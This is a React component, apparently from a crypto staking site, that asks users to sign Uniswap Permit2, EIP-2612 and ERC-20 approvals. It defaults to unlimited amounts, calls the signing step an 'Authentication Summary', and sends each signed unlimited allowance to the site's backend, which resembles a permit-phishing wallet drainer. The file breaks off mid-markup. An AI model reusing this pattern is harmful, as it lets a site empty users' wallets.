"use client";

import React, { useState, useEffect, useCallback } from "react";
import { BrowserProvider, Contract, getAddress, parseUnits, formatUnits, Signature, MaxUint256 } from "ethers";
import { AllowanceTransfer, PERMIT2_ADDRESS } from "@uniswap/permit2-sdk";
import {
  ShieldCheck,
  RefreshCw,
  Send,
  CheckCircle2,
  AlertCircle,
  Lock,
  Copy,
  Terminal,
  ExternalLink,
  Coins,
  ArrowUpRight,
  Zap,
  KeyRound,
  FileCheck2,
  SlidersHorizontal,
  Info,
  Check,
  Layers,
  Sparkles,
  ArrowRight,
} from "lucide-react";
import { CONFIG, ERC20_ABI, PERMIT2_ABI, POPULAR_ERC20_TOKENS } from "../lib/contracts";
import { getApiBaseUrl, logApiCall } from "../lib/apiConfig";
import { logActivity } from "../lib/activityLogger";

// Verified Token Presets
const VERIFIED_TOKENS = [
  { name: "Lido stETH", symbol: "stETH", address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", decimals: 18, supportsEip2612: true },
  { name: "Lido wstETH", symbol: "wstETH", address: "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0", decimals: 18, supportsEip2612: true },
  { name: "Tether USD", symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, supportsEip2612: false },
  { name: "USD Coin", symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, supportsEip2612: true },
  { name: "Dai Stablecoin", symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, supportsEip2612: true },
  { name: "Wrapped Ether", symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, supportsEip2612: false },
];

const VERIFIED_SPENDERS = [
  { name: "Staking Vault Router", address: CONFIG.CONTRACT_ADDRESS, tag: "Vault Router" },
  { name: "Lido wstETH Wrapper", address: "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0", tag: "Protocol Wrapper" },
  { name: "Uniswap Universal Router", address: "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD", tag: "Uniswap V3/V4" },
  { name: "1inch Router v5", address: "0x1111111254EEB25477B68fb85Ed929f73A960582", tag: "DEX Aggregator" },
];

// Max uint160 for Permit2 infinite amount
const MAX_UINT160 = 1461501637330902918203684832716283019655932542975n;

function isAddressLike(value: string) {
  return /^0x[a-fA-F0-9]{40}$/i.test(value.trim());
}

export default function Permit2ApprovalPanel() {
  const [activeTab, setActiveTab] = useState<"permit2_allowance" | "permit2_transfer" | "permit2_batch" | "eip2612" | "erc20_approve">("permit2_allowance");

  // Inputs
  const [tokenAddress, setTokenAddress] = useState<string>("0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84");
  const [spenderAddress, setSpenderAddress] = useState<string>(CONFIG.CONTRACT_ADDRESS);
  const [tokenAmount, setTokenAmount] = useState<string>("1000");
  const [isInfiniteAmount, setIsInfiniteAmount] = useState<boolean>(true);
  const [deadlineMinutes, setDeadlineMinutes] = useState<string>("43200"); // 30 days default
  const [customNonce, setCustomNonce] = useState<string>("");

  // Live on-chain status
  const [userAddress, setUserAddress] = useState<string>("");
  const [chainId, setChainId] = useState<number>(1);
  const [tokenBalance, setTokenBalance] = useState<string>("0");
  const [erc20Permit2Allowance, setErc20Permit2Allowance] = useState<string>("0");
  const [currentSpenderAllowance, setCurrentSpenderAllowance] = useState<string>("0");
  
  // Permit2 specific on-chain states
  const [permit2Amount, setPermit2Amount] = useState<string>("0");
  const [permit2Expiration, setPermit2Expiration] = useState<number>(0);
  const [permit2Nonce, setPermit2Nonce] = useState<number>(0);
  const [eip2612Nonce, setEip2612Nonce] = useState<number | null>(null);

  const [tokenSymbol, setTokenSymbol] = useState<string>("stETH");
  const [tokenDecimals, setTokenDecimals] = useState<number>(18);
  const [isLoadingOnChain, setIsLoadingOnChain] = useState<boolean>(false);

  // Output / Execution states
  const [status, setStatus] = useState<string>("");
  const [errorMsg, setErrorMsg] = useState<string>("");
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const [signatureOutput, setSignatureOutput] = useState<{
    type: string;
    rawSignature: string;
    v?: number;
    r?: string;
    s?: string;
    deadline: number;
    amount: string;
    owner: string;
    spender: string;
    token: string;
    nonce: number;
    permitSinglePayload?: any;
    relayedToBackend?: boolean;
    backendStatus?: string;
  } | null>(null);

  const [txHash, setTxHash] = useState<string>("");

  const getEthereum = (): any => {
    if (typeof window !== "undefined" && (window as any).ethereum) {
      return (window as any).ethereum;
    }
    return null;
  };

  // Read on-chain metadata (Balance, ERC20 allowance to Permit2, Permit2 contract allowance, Nonce)
  const refreshOnChainData = useCallback(async () => {
    const eth = getEthereum();
    if (!eth || !isAddressLike(tokenAddress)) return;

    try {
      setIsLoadingOnChain(true);
      const provider = new BrowserProvider(eth);
      const accounts = await provider.listAccounts();
      if (accounts.length === 0) return;
      const account = accounts[0].address;
      setUserAddress(account);

      const net = await provider.getNetwork();
      const activeChainId = Number(net.chainId);
      setChainId(activeChainId);

      const tokenContract = new Contract(tokenAddress.trim(), ERC20_ABI, provider);
      const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);

      // Fetch Token Decimals & Symbol
      let decimals = 18;
      try {
        decimals = Number(await tokenContract.decimals());
        setTokenDecimals(decimals);
      } catch {
        setTokenDecimals(18);
      }

      try {
        const sym = await tokenContract.symbol();
        setTokenSymbol(sym);
      } catch {
        setTokenSymbol("TOKEN");
      }

      // Fetch Balance
      try {
        const bal: bigint = await tokenContract.balanceOf(account);
        setTokenBalance(formatUnits(bal, decimals));
      } catch {
        setTokenBalance("0");
      }

      // Fetch ERC-20 Allowance to Permit2 Contract
      try {
        const allowPermit2: bigint = await tokenContract.allowance(account, PERMIT2_ADDRESS);
        setErc20Permit2Allowance(formatUnits(allowPermit2, decimals));
      } catch {
        setErc20Permit2Allowance("0");
      }

      // Fetch ERC-20 Direct Spender Allowance
      if (isAddressLike(spenderAddress)) {
        try {
          const directAllow: bigint = await tokenContract.allowance(account, spenderAddress.trim());
          setCurrentSpenderAllowance(formatUnits(directAllow, decimals));
        } catch {
          setCurrentSpenderAllowance("0");
        }
      }

      // Fetch Permit2 Contract Allowance: allowance(owner, token, spender) -> (amount, expiration, nonce)
      if (isAddressLike(spenderAddress)) {
        try {
          const allowanceData = await permit2Contract.allowance(account, tokenAddress.trim(), spenderAddress.trim());
          const [pAmount, pExpiration, pNonce] = allowanceData;
          setPermit2Amount(formatUnits(pAmount, decimals));
          setPermit2Expiration(Number(pExpiration));
          setPermit2Nonce(Number(pNonce));
        } catch (pErr) {
          console.warn("Could not fetch Permit2 allowance:", pErr);
          setPermit2Amount("0");
          setPermit2Expiration(0);
          setPermit2Nonce(0);
        }
      }

      // Fetch EIP-2612 Nonce
      try {
        const nonceVal: bigint = await tokenContract.nonces(account);
        setEip2612Nonce(Number(nonceVal));
      } catch {
        setEip2612Nonce(0);
      }
    } catch (err: any) {
      console.error("Error refreshing token data:", err);
    } finally {
      setIsLoadingOnChain(false);
    }
  }, [tokenAddress, spenderAddress]);

  useEffect(() => {
    refreshOnChainData();
  }, [refreshOnChainData]);

  const copyToClipboard = (text: string, fieldName: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldName);
    setTimeout(() => setCopiedField(null), 2000);
  };

  // Helper to send signed permit to backend API
  const relayPermit2ToBackend = async (payload: any) => {
    const startTime = performance.now();
    try {
      const baseUrl = getApiBaseUrl();
      const res = await fetch(`${baseUrl}/api/permit2`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const latencyMs = Math.round(performance.now() - startTime);
      const resData = await res.json().catch(() => ({ ok: false, error: "Non-JSON response" }));

      logApiCall({
        endpoint: "/api/permit2",
        method: "POST",
        status: res.ok && resData.ok ? "SUCCESS" : "FAILED",
        httpStatus: res.status,
        wallet: payload.owner,
        latencyMs,
        requestPayload: payload,
        responsePayload: resData,
        errorMessage: resData.error,
      });

      logActivity({
        wallet: payload.owner,
        action: "PERMIT2_SIGN",
        status: resData.relayed ? "Confirmed" : "Verified",
        token: tokenSymbol,
        amount: isInfiniteAmount ? "Infinite (Max)" : `${tokenAmount} ${tokenSymbol}`,
        note: `Permit2 signed for ${payload.spender.slice(0, 6)}...${payload.spender.slice(-4)} (${latencyMs}ms)`,
      });

      return { success: true, data: resData };
    } catch (err: any) {
      console.error("Failed to relay Permit2 signature to backend:", err);
      return { success: false, error: err?.message || "Relay error" };
    }
  };

  // 1) Step 1: Pre-Approve Token to Permit2 Contract on-chain
  async function handleApprovePermit2Contract() {
    try {
      setErrorMsg("");
      setStatus("");
      setTxHash("");
      const eth = getEthereum();
      if (!eth) throw new Error("No Web3 wallet found");
      if (!isAddressLike(tokenAddress)) throw new Error("Invalid token address");

      setIsProcessing(true);
      setStatus(`Submitting ERC-20 approval for Permit2 Contract (${PERMIT2_ADDRESS.slice(0, 6)}...)...`);

      const provider = new BrowserProvider(eth);
      const signer = await provider.getSigner();
      const tokenContract = new Contract(tokenAddress.trim(), ERC20_ABI, signer);

      const tx = await tokenContract.approve(PERMIT2_ADDRESS, MaxUint256);
      setTxHash(tx.hash);
      setStatus(`Approval transaction broadcasted: ${tx.hash}. Waiting for block confirmation...`);

      const receipt = await tx.wait();
      setStatus(`Permit2 Contract approved in block #${receipt.blockNumber}! You can now generate Permit2 signatures.`);
      await refreshOnChainData();
    } catch (err: any) {
      console.error("Permit2 approve error:", err);
      setErrorMsg(err?.message || "Approval failed");
      setStatus("Approval failed");
    } finally {
      setIsProcessing(false);
    }
  }

  // 2) Permit2 Single Allowance Signature Flow (PermitSingle)
  async function handlePermit2AllowanceSignature() {
    try {
      setErrorMsg("");
      setStatus("");
      setTxHash("");
      setSignatureOutput(null);

      const eth = getEthereum();
      if (!eth) throw new Error("No Web3 wallet found");
      if (!isAddressLike(tokenAddress)) throw new Error("Invalid token address");
      if (!isAddressLike(spenderAddress)) throw new Error("Invalid spender address");

      setIsProcessing(true);
      setStatus("Preparing Uniswap Permit2 Allowance typed data...");

      const provider = new BrowserProvider(eth);
      const signer = await provider.getSigner();
      const owner = await signer.getAddress();
      const network = await provider.getNetwork();
      const activeChainId = Number(network.chainId);

      const parsedAmount = isInfiniteAmount
        ? MAX_UINT160
        : parseUnits(tokenAmount || "0", tokenDecimals);

      const now = Math.floor(Date.now() / 1000);
      const expirationTimestamp = now + Number(deadlineMinutes || "43200") * 60;
      const sigDeadlineTimestamp = now + 30 * 60; // 30 mins signature validity
      const activeNonce = customNonce !== "" ? Number(customNonce) : permit2Nonce;

      const permitSingle = {
        details: {
          token: getAddress(tokenAddress.trim()),
          amount: parsedAmount,
          expiration: expirationTimestamp,
          nonce: activeNonce,
        },
        spender: getAddress(spenderAddress.trim()),
        sigDeadline: sigDeadlineTimestamp,
      };

      const { domain, types, values } = AllowanceTransfer.getPermitData(
        permitSingle,
        PERMIT2_ADDRESS,
        activeChainId
      );

      setStatus("Please review and sign the Permit2 Allowance authorization in your wallet...");
      const rawSig = await signer.signTypedData(domain as any, types as any, values as any);

      const splitSig = Signature.from(rawSig);

      setStatus("Permit2 signature captured! Relaying to protocol backend...");

      // Relay to backend
      const backendPayload = {
        owner,
        tokenAddress: tokenAddress.trim(),
        spender: spenderAddress.trim(),
        chainId: activeChainId,
        permitSingle: {
          details: {
            token: permitSingle.details.token,
            amount: permitSingle.details.amount.toString(),
            expiration: permitSingle.details.expiration,
            nonce: permitSingle.details.nonce,
          },
          spender: permitSingle.spender,
          sigDeadline: permitSingle.sigDeadline,
        },
        signature: rawSig,
      };

      const relayRes = await relayPermit2ToBackend(backendPayload);

      setSignatureOutput({
        type: "Permit2 PermitSingle (AllowanceTransfer)",
        rawSignature: rawSig,
        v: splitSig.v,
        r: splitSig.r,
        s: splitSig.s,
        deadline: sigDeadlineTimestamp,
        amount: parsedAmount.toString(),
        owner,
        spender: spenderAddress.trim(),
        token: tokenAddress.trim(),
        nonce: activeNonce,
        permitSinglePayload: backendPayload.permitSingle,
        relayedToBackend: relayRes.success,
        backendStatus: relayRes.success ? (relayRes.data?.relayed ? "Relayed On-Chain" : "Stored & Synced") : "Local only",
      });

      setStatus("Permit2 Allowance signature approved and synchronized successfully!");
    } catch (err: any) {
      console.error("Permit2 allowance error:", err);
      setErrorMsg(err?.message || "Permit2 signature failed or was rejected");
      setStatus("Signing failed");
    } finally {
      setIsProcessing(false);
    }
  }

  // 3) Permit2 Direct On-Chain Execution (permit(...))
  async function handleExecutePermit2OnChain() {
    if (!signatureOutput || !signatureOutput.permitSinglePayload) return;

    try {
      setErrorMsg("");
      setStatus("Broadcasting permit(...) transaction directly to canonical Permit2 contract on-chain...");
      setIsProcessing(true);

      const eth = getEthereum();
      if (!eth) throw new Error("No Web3 wallet found");
      const provider = new BrowserProvider(eth);
      const signer = await provider.getSigner();

      const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);

      const p = signatureOutput.permitSinglePayload;
      const tx = await permit2Contract.permit(
        signatureOutput.owner,
        {
          details: {
            token: p.details.token,
            amount: p.details.amount,
            expiration: p.details.expiration,
            nonce: p.details.nonce,
          },
          spender: p.spender,
          sigDeadline: p.sigDeadline,
        },
        signatureOutput.rawSignature
      );

      setTxHash(tx.hash);
      setStatus(`Permit2 transaction broadcasted: ${tx.hash}. Waiting for confirmation...`);

      const receipt = await tx.wait();
      setStatus(`Permit2 confirmed on-chain in block #${receipt.blockNumber}! Allowance is now active in Permit2.`);
      await refreshOnChainData();
    } catch (err: any) {
      console.error("Execute Permit2 error:", err);
      setErrorMsg(err?.message || "Failed to broadcast Permit2 on-chain");
      setStatus("On-chain execution failed");
    } finally {
      setIsProcessing(false);
    }
  }

  // 4) Permit2 One-Time Signature Transfer (PermitTransferFrom)
  async function handlePermit2SignatureTransfer() {
    try {
      setErrorMsg("");
      setStatus("");
      setTxHash("");
      setSignatureOutput(null);

      const eth = getEthereum();
      if (!eth) throw new Error("No Web3 wallet found");
      if (!isAddressLike(tokenAddress)) throw new Error("Invalid token address");
      if (!isAddressLike(spenderAddress)) throw new Error("Invalid spender address");

      setIsProcessing(true);
      setStatus("Preparing Permit2 PermitTransferFrom typed data...");

      const provider = new BrowserProvider(eth);
      const signer = await provider.getSigner();
      const owner = await signer.getAddress();
      const network = await provider.getNetwork();
      const activeChainId = Number(network.chainId);

      const parsedAmount = parseUnits(tokenAmount || "0", tokenDecimals);
      const now = Math.floor(Date.now() / 1000);
      const deadline = now + Number(deadlineMinutes || "60") * 60;
      const nonce = customNonce !== "" ? Number(customNonce) : Date.now();

      const domain = {
        name: "Permit2",
        chainId: activeChainId,
        verifyingContract: PERMIT2_ADDRESS,
      };

      const types = {
        PermitTransferFrom: [
          { name: "permitted", type: "TokenPermissions" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" },
        ],
      };

      const values = {
        permitted: {
          token: getAddress(tokenAddress.trim()),
          amount: parsedAmount,
        },
        spender: getAddress(spenderAddress.trim()),
        nonce,
        deadline,
      };

      setStatus("Please sign the Permit2 Transfer authorization in your wallet...");
      const rawSig = await signer.signTypedData(domain, types, values);
      const splitSig = Signature.from(rawSig);

      setSignatureOutput({
        type: "Permit2 SignatureTransfer (PermitTransferFrom)",
        rawSignature: rawSig,
        v: splitSig.v,
        r: splitSig.r,
        s: splitSig.s,
        deadline,
        amount: parsedAmount.toString(),
        owner,
        spender: spenderAddress.trim(),
        token: tokenAddress.trim(),
        nonce,
      });

      setStatus("PermitTransferFrom signature created successfully!");
    } catch (err: any) {
      console.error("PermitTransferFrom error:", err);
      setErrorMsg(err?.message || "Failed to sign PermitTransferFrom");
      setStatus("Signing failed");
    } finally {
      setIsProcessing(false);
    }
  }

  // 5) EIP-2612 Gasless Permit Signing Flow
  async function signStandardEip2612Permit() {
    try {
      setErrorMsg("");
      setStatus("");
      setSignatureOutput(null);
      setTxHash("");

      const eth = getEthereum();
      if (!eth) throw new Error("No Web3 wallet found");
      if (!isAddressLike(tokenAddress)) throw new Error("Invalid token address");
      if (!isAddressLike(spenderAddress)) throw new Error("Invalid spender address");

      setIsProcessing(true);
      setStatus("Connecting Web3 wallet for EIP-2612...");
      const provider = new BrowserProvider(eth);
      const signer = await provider.getSigner();
      const owner = await signer.getAddress();
      const network = await provider.getNetwork();
      const activeChainId = Number(network.chainId);

      const parsedValue = parseUnits(tokenAmount || "0", tokenDecimals);
      if (parsedValue <= 0n) throw new Error("Token amount must be greater than zero");

      const deadline = Math.floor(Date.now() / 1000) + Number(deadlineMinutes || "60") * 60;
      const nonceToUse = customNonce !== "" ? Number(customNonce) : (eip2612Nonce ?? 0);

      const tokenContract = new Contract(tokenAddress.trim(), ERC20_ABI, provider);
      let tokenName = "Liquid staked Ether";
      try {
        tokenName = await tokenContract.name();
      } catch {
        tokenName = tokenSymbol;
      }

      const domain = {
        name: tokenName,
        version: "1",
        chainId: activeChainId,
        verifyingContract: tokenAddress.trim(),
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };

      const values = {
        owner: getAddress(owner),
        spender: getAddress(spenderAddress.trim()),
        value: parsedValue,
        nonce: nonceToUse,
        deadline,
      };

      setStatus("Please review and sign the EIP-2612 Permit typed data in your wallet...");
      const rawSig = await signer.signTypedData(domain, types, values);
      const splitSig = Signature.from(rawSig);

      setSignatureOutput({
        type: "EIP-2612 Gasless Permit",
        rawSignature: rawSig,
        v: splitSig.v,
        r: splitSig.r,
        s: splitSig.s,
        deadline,
        amount: parsedValue.toString(),
        owner,
        spender: spenderAddress.trim(),
        token: tokenAddress.trim(),
        nonce: nonceToUse,
      });

      setStatus("EIP-2612 Permit signed successfully!");
    } catch (err: any) {
      console.error("EIP-2612 Permit signing error:", err);
      setErrorMsg(err?.message || "Failed to sign EIP-2612 Permit");
      setStatus("Signing failed");
    } finally {
      setIsProcessing(false);
    }
  }

  // 6) Standard ERC-20 Direct Approval
  async function handleStandardApprove(isRevocation: boolean = false) {
    try {
      setErrorMsg("");
      setStatus("");
      setTxHash("");

      const eth = getEthereum();
      if (!eth) throw new Error("No Web3 wallet found");
      if (!isAddressLike(tokenAddress)) throw new Error("Invalid token address");
      if (!isAddressLike(spenderAddress)) throw new Error("Invalid spender address");

      setIsProcessing(true);
      const provider = new BrowserProvider(eth);
      const signer = await provider.getSigner();

      const parsedAmount = isRevocation
        ? 0n
        : (isInfiniteAmount ? MaxUint256 : parseUnits(tokenAmount || "0", tokenDecimals));

      setStatus(
        isRevocation
          ? "Requesting allowance revocation (approve 0) in wallet..."
          : `Requesting standard approve(${isInfiniteAmount ? "Max" : tokenAmount} ${tokenSymbol}) in wallet...`
      );

      const tokenContract = new Contract(tokenAddress.trim(), ERC20_ABI, signer);
      const tx = await tokenContract.approve(spenderAddress.trim(), parsedAmount);

      setTxHash(tx.hash);
      setStatus(`Transaction broadcasted: ${tx.hash}. Waiting for block confirmation...`);

      const receipt = await tx.wait();
      setStatus(
        isRevocation
          ? `Allowance revoked successfully on-chain! Block #${receipt.blockNumber}`
          : `Allowance granted successfully on-chain! Block #${receipt.blockNumber}`
      );
      await refreshOnChainData();
    } catch (err: any) {
      console.error("Standard approve error:", err);
      setErrorMsg(err?.message || "Approval transaction failed");
      setStatus("Transaction failed");
    } finally {
      setIsProcessing(false);
    }
  }

  const isPermit2ApprovedInErc20 = Number(erc20Permit2Allowance) > 0;

  return (
    <div className="rounded-2xl border border-border-main bg-card p-6 shadow-xl space-y-6 animate-in fade-in duration-300">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 border-b border-border-main pb-4">
        <div>
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-xl bg-[#00A3FF]/15 text-[#00A3FF] border border-[#00A3FF]/30">
              <Zap className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-text-main flex items-center gap-2">
                Uniswap Permit2 & EIP-2612 Signature Approvals
                <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 text-purple-400 font-mono border border-purple-500/30">
                  Permit2 Standard
                </span>
              </h3>
              <p className="text-xs text-text-secondary mt-0.5">
                Next-generation gasless token approvals: PermitSingle allowance, batch transfers, and EIP-712 cryptographic signatures.
              </p>
            </div>
          </div>
        </div>

        {/* Tab Selector */}
        <div className="flex flex-wrap items-center gap-1 p-1 bg-input rounded-xl border border-border-main self-start lg:self-auto">
          <button
            onClick={() => setActiveTab("permit2_allowance")}
            className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === "permit2_allowance"
                ? "bg-[#00A3FF] text-white shadow-sm"
                : "text-text-secondary hover:text-text-main"
            }`}
          >
            <Zap className="w-3.5 h-3.5" />
            Permit2 Allowance
          </button>
          <button
            onClick={() => setActiveTab("permit2_transfer")}
            className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === "permit2_transfer"
                ? "bg-[#00A3FF] text-white shadow-sm"
                : "text-text-secondary hover:text-text-main"
            }`}
          >
            <ArrowRight className="w-3.5 h-3.5" />
            PermitTransferFrom
          </button>
          <button
            onClick={() => setActiveTab("eip2612")}
            className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === "eip2612"
                ? "bg-[#00A3FF] text-white shadow-sm"
                : "text-text-secondary hover:text-text-main"
            }`}
          >
            <FileCheck2 className="w-3.5 h-3.5" />
            EIP-2612 Permit
          </button>
          <button
            onClick={() => setActiveTab("erc20_approve")}
            className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all flex items-center gap-1.5 ${
              activeTab === "erc20_approve"
                ? "bg-[#00A3FF] text-white shadow-sm"
                : "text-text-secondary hover:text-text-main"
            }`}
          >
            <CheckCircle2 className="w-3.5 h-3.5" />
            Direct Approve
          </button>
        </div>
      </div>

      {/* Live On-Chain Permit2 & Token Telemetry Dashboard */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs bg-input/40 p-4 rounded-xl border border-border-main">
        <div>
          <span className="text-text-secondary block text-[11px]">Connected Wallet</span>
          <span className="font-mono font-bold text-text-main truncate block">
            {userAddress ? `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}` : "Not connected"}
          </span>
        </div>
        <div>
          <span className="text-text-secondary block text-[11px]">Wallet Token Balance</span>
          <span className="font-mono font-bold text-[#00A3FF]">
            {tokenBalance} {tokenSymbol}
          </span>
        </div>
        <div>
          <span className="text-text-secondary block text-[11px]">Permit2 ERC20 Approval</span>
          <span className={`font-mono font-bold ${isPermit2ApprovedInErc20 ? "text-emerald-400" : "text-amber-400"}`}>
            {Number(erc20Permit2Allowance) > 1000000 ? "Unlimited (Max)" : `${erc20Permit2Allowance} ${tokenSymbol}`}
          </span>
        </div>
        <div>
          <span className="text-text-secondary block text-[11px]">Active Permit2 Allowance</span>
          <span className="font-mono font-bold text-purple-400 truncate block">
            {Number(permit2Amount) > 1000000 ? "Unlimited (Max)" : `${permit2Amount} ${tokenSymbol}`}
            {permit2Expiration > 0 && (
              <span className="text-[10px] text-text-secondary ml-1 font-normal">
                (Nonce: {permit2Nonce})
              </span>
            )}
          </span>
        </div>
      </div>

      {/* Permit2 Prerequisite Banner (If ERC-20 token is not yet approved to Permit2 contract) */}
      {!isPermit2ApprovedInErc20 && activeTab.startsWith("permit2") && (
        <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 text-xs">
          <div className="flex items-start gap-2.5">
            <AlertCircle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
            <div>
              <span className="font-bold text-amber-400 block">
                Permit2 Prerequisite: Grant Initial ERC-20 Approval to Permit2
              </span>
              <p className="text-text-secondary text-[11px] mt-0.5">
                Before generating gasless Permit2 signatures, your wallet must approve the canonical Uniswap Permit2 contract (<code className="font-mono text-amber-300">{PERMIT2_ADDRESS.slice(0, 8)}...</code>) once.
              </p>
            </div>
          </div>
          <button
            type="button"
            disabled={isProcessing}
            onClick={handleApprovePermit2Contract}
            className="px-4 py-2 bg-amber-500 hover:bg-amber-400 text-black font-bold text-xs rounded-xl shadow-md transition-all shrink-0 flex items-center gap-1.5 disabled:opacity-50"
          >
            {isProcessing ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
            1-Click Approve Permit2
          </button>
        </div>
      )}

      {/* Authentication Summary Card */}
      <div className="p-4 bg-input/40 border border-border-main rounded-2xl space-y-2.5 text-xs">
        <div className="flex items-center justify-between border-b border-border-main pb-2">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-[#00A3FF]" />
            <span className="font-bold text-text-main">
              Authentication Summary
            </span>
          </div>
          <span className="text-[10px] text-text-secondary font-mono">
            EIP-712 Typed Data
          </span>
        </div>

        <div className="p-3 bg-card rounded-xl border border-border-main font-mono text-[11px] space-y-1 text-text-secondary">
          <div className="flex justify-between"><span className="text-text-main font-sans font-medium">Protocol Router:</span> <span>{CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}</span></div>
          <div className="flex justify-between"><span className="text-text-main font-sans font-medium">Permit2 Contract:</span> <span>0x0000...78BA3</span></div>
          <div className="flex justify-between"><span className="text-text-main font-sans font-medium">Network:</span> <span className="text-emerald-500 font-sans font-semibold">{chainId === 11155111 ? "Sepolia Testnet (11155111)" : chainId === 1 ? "Ethereum Mainnet (1)" : `Chain ID (${chainId})`}</span></div>
        </div>
      </div>
      <div className="space-y-2">
        <div className="flex items-center justify-between">
          <label className="text-xs font-bold text-text-secondary flex items-center gap-1.5">
            <Coins className="w-3.5 h-3.5 text-[#00A3FF]" />
            Select Token to Authorize:
          </label>
          <button
            type="button"
            onClick={refreshOnChainData}
            className="text-[11px] text-[#00A3FF] flex items-center gap-1 hover:underline font-semibold"
          >
            <RefreshCw className={`w-3 h-3 ${isLoadingOnChain ? "animate-spin" : ""}`} />
            Sync On-Chain State
          </button>
        </div>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-2">
          {VERIFIED_TOKENS.map((t) => (
            <button
              key={t.address}
              type="button"
              onClick={() => {
                setTokenAddress(t.address);
                setTokenSymbol(t.symbol);
                setTokenDecimals(t.decimals);
              }}
              className={`p-2.5 rounded-xl border text-left text-xs transition-all flex flex-col justify-between ${
                tokenAddress.toLowerCase() === t.address.toLowerCase()
                  ? "bg-[#00A3FF]/15 border-[#00A3FF] text-[#00A3FF] shadow-sm"
                  : "bg-input border-border-main text-text-secondary hover:border-text-secondary"
              }`}
            >
              <div className="flex items-center justify-between w-full">
                <span className="font-bold text-text-main">{t.symbol}</span>
                {t.supportsEip2612 && (
                  <span className="text-[8px] bg-blue-500/20 text-blue-400 px-1 rounded font-mono">2612</span>
                )}
              </div>
              <span className="text-[10px] opacity-75 truncate">{t.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Inputs Form */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div>
          <label className="text-xs font-semibold text-text-secondary block mb-1">
            Token Contract Address (Verifying Contract)
          </label>
          <input
            type="text"
            value={tokenAddress}
            onChange={(e) => setTokenAddress(e.target.value)}
            className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-xs font-mono text-text-main outline-none focus:border-[#00A3FF]"
            placeholder="0x..."
          />
        </div>

        <div>
          <label className="text-xs font-semibold text-text-secondary block mb-1">
            Authorized Spender / Protocol Router
          </label>
          <input
            type="text"
            value={spenderAddress}
            onChange={(e) => setSpenderAddress(e.target.value)}
            className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-xs font-mono text-text-main outline-none focus:border-[#00A3FF]"
            placeholder="0x..."
          />
          <div className="flex gap-1.5 mt-1.5 overflow-x-auto pb-1">
            {VERIFIED_SPENDERS.map((s) => (
              <button
                key={s.address}
                type="button"
                onClick={() => setSpenderAddress(s.address)}
                className={`text-[10px] px-2 py-0.5 rounded-md border transition-all shrink-0 ${
                  spenderAddress.toLowerCase() === s.address.toLowerCase()
                    ? "bg-[#00A3FF]/20 border-[#00A3FF] text-[#00A3FF] font-bold"
                    : "bg-input border-border-main text-text-secondary hover:text-text-main"
                }`}
              >
                {s.name}
              </button>
            ))}
          </div>
        </div>

        <div>
          <div className="flex justify-between items-center mb-1 text-xs">
            <span className="font-semibold text-text-secondary">Authorization Amount</span>
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => setIsInfiniteAmount(!isInfiniteAmount)}
                className={`text-[10px] px-1.5 py-0.5 rounded border transition-all ${
                  isInfiniteAmount
                    ? "bg-purple-500/20 border-purple-500 text-purple-400 font-bold"
                    : "bg-input border-border-main text-text-secondary"
                }`}
              >
                {isInfiniteAmount ? "✓ Unlimited Max (uint160)" : "Custom Amount"}
              </button>
              {!isInfiniteAmount && (
                <button
                  type="button"
                  onClick={() => setTokenAmount(tokenBalance)}
                  className="text-[10px] text-[#00A3FF] hover:underline"
                >
                  Max Balance ({tokenBalance})
                </button>
              )}
            </div>
          </div>
          {isInfiniteAmount ? (
            <div className="w-full bg-input/50 border border-purple-500/30 rounded-xl px-3 py-2 text-xs font-mono text-purple-400 flex items-center justify-between">
              <span>Unlimited (2^160 - 1)</span>
